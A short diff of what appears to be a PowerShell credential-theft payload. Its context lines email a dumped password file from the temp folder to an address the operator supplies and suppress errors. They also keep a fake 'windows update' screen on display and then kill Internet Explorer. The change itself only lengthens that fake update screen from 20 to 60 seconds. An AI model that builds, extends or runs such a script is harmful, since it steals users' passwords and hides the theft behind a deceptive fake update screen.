@@ -33,5 +33,5 @@ function Send-ToEmail([string]$email, [string]$attachmentpath){
 #Replace the to-address-email with the email address you want the password file sent to.
 Send-ToEmail  -email "to-address-email" -attachmentpath $env:temp\dumped.txt 2>$null;
 #Change the seconds accordingly , It specifies how long the windows update should stay on screen
-Start-Sleep -Seconds 20
+Start-Sleep -Seconds 60
 Get-Process -Name iexplore | Stop-Process
